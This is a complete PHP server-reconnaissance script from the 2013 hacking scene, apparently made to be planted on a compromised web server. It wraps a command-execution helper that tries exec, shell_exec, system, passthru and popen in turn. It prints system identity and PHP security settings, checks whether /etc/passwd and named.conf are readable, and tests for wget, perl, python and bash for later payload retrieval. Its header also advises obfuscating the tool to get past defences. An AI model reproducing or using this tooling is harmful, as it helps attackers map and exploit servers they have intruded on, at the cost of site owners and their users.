<?
/*
This File Was Writed By DamaneDz.

Some Update Ideas By Mauritania Attacker.

Twitter:@DamaneDz
Email:Damane-Dz@hotmail.com Or Skype:Damane2011

P.S: If The Tool Will Not Work Good Try To Crypt IT ^_^

GooD Luck.

The Last Update:16/03/2013

******************************************************
Change Log:
----------
16/03/2013:
1-Add The Current Dir Option 
2-Coloring Some Results
----------
******************************************************

*/

@error_reporting(0);

function excute($cfe) {
  $res = '';
  if (!empty($cfe)) {
    if(@function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(@function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(@function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() Disabled!"; }
  }
  return $res;
}

  // Show Stat
  function showstat($stat) {
    if ($stat=="on") { return "<font color=green><b>ON</b></font>"; }
    else { return "<font color=red><b>OFF</b></font>"; }
  }
  function named_conf(){
  if(@is_readable('/etc/named.conf')){ return "<font color=green><b>Readable</b></font>";
  }else { return "<font color=red><b>Not Readable</b></font>"; }
  }
  function passwd(){
  if(@is_readable('/etc/passwd')){ return "<font color=green><b>Readable</b></font>";
  }else { return "<font color=red><b>Not Readable</b></font>"; }
  }
  function testoracle() {
  if (@function_exists('ocilogon')) { return showstat("on"); }
  else { return showstat("off"); }
  }
  function testpostgresql() {
    if (@function_exists('pg_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testmssql() {
    if (@function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testmysql() {
    if (@function_exists('mysql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }

  function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<font color=red><b>".$disablefunc."</b></font>"; }
    else { return "<font color=green><b>NONE</b></b></font>"; }
  }
    function openbase_dir() {
    if ($openbase_dir=@ini_get('open_basedir')){ return "<font color=red><b>".$openbase_dir."</b></font>"; }
    else { return "<font color=green><b>NONE</b></b></font>"; }
  }
    function testfetch() {
    if(excute('fetch --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testwget() {
    if (excute('wget --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testperl() {
    if (excute('perl --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testpy() {
    if (excute('python --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
      function testsh() {
    if (excute('bash --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testcurl() {
    if (@function_exists('curl_version')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<font color=red><b>ON (Secure)</b></font>";
  }else{
    $safemode = FALSE;
    $hsafemode = "<font color=green><b>OFF (Not Secure)</b></font>";
  }
  
  $pwd=str_replace('\\', '/', dirname(__FILE__)).'/';
  
echo "
<html><head><title>x00x Server Info ~ ".$_SERVER['HTTP_HOST']." ~</title></head><body>
<style type=text/css>
body{background-color:#111;font-family:verdana;}
.info{background-color:#fff; width=100%;}
input,textarea{border:1px solid #000;} 
</style>
<div class=info>
<table bgcolor=#ff0000 width=100%px height=20px><tr>
<td><font color=#fff size=1px><center>x00x Server Info[Coded By: DamaneDz] & [Update Ideas By:Mauritania Attacker]</center></font></td>
</tr></table>
<font color=#000 size=2px>
<center><span><font color='#111'>
<br> UName -a: <font color=blue>".@php_uname()." </font>|</br>
<br> Hostname: <font color=blue>".$_SERVER['HTTP_HOST']."</font>|</br>
<br> Software : <font color=blue>".@getenv("SERVER_SOFTWARE")." </font>| </br>
<br> PHP Version: <font color=blue>".@phpversion()." </font>|</br>
<br> Current Dir: <font color=blue>{$pwd} |</font></br>
<br> ID:<font color=blue>" .@getmyuid()."(".@get_current_user().") </font>- UID:<font color=blue>".@getmyuid()."(".@get_current_user().") </font>- GID:<font color=blue>".@getmygid()."(".@get_current_user().") </font>|</br>
<br> Your IP:<font color=blue>".$_SERVER["REMOTE_ADDR"]." </font>| The Server IP:<font color=blue>".@gethostbyname($_SERVER["HTTP_HOST"])." </font>|</br>
<br> Safe Mode: $hsafemode | Open_BaseDir: ".openbase_dir()."|</br>
<br> Disabled Functions: ".@showdisablefunctions()."|</br>
<br> named.conf File is: ".named_conf()." | passwd File is: ".passwd()."</br>
<br>
MySQL: ".@testmysql()."|
MSSQL: ".@testmssql()."|
Oracle: ".@testoracle()."|
PostgreSQL: ".@testpostgresql()."|
cURL: ".@testcurl()."|
Fetch: ".@testfetch()."|
WGet: ".@testwget()."|
Perl: ".@testperl()."|
Python: ".@testpy()."|
Bash: ".@testsh()."|
</center>
</font>
<br/>
</div>
<p align='center'><font color='#FF00FF'>By DamaneDz & Mauritania Attacker<br/></font></p>
<br/>
";
?>
